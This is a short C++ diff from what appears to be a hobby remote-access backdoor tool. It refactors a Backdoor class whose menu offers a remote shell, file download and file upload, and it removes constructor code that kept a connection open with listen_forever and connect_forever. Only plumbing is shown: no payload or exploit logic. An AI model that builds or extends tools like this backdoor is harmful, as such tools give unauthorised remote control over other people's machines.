@@ -49,17 +49,19 @@ void Backdoor::menu(){
 
 
     if(choice == 1){
-        b.shell();
+        this->shell();
     
     }else if(choice == 2){
         char * path;
-        b.download(path);
+         // Get path
+
+        this->download(path);
 
 
     }else if(choice == 3){
         char *path;
     
-        b.upload(path);
+        this->upload(path);
     
     }else{
         std::cout << "Comando inválido" << std::endl;
@@ -67,14 +69,9 @@ void Backdoor::menu(){
 }
 
 
-Backdoor::Backdoor(char *ip, int port, bool is_server){
-    this->c = new Communication(ip, port);
+Backdoor::Backdoor(int sock, Communication *c, bool is_server){
+    this->sock = sock;
+    this->c  = c;
     this->is_server = is_server;
-    
-    if(is_server){
-        this->c->listen_forever();
 
-    }else{
-        this->c->connect_forever();
-    }
 }
